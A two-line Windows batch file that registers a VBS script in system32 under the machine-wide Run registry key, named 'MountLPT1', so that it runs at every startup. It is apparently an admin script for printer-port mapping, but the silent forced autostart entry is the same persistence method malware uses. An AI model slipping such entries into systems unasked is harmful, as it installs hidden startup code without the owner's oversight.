@echo off
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v "MountLPT1" /t REG_SZ /d "c:\windows\system32\sliptmu.vbs"

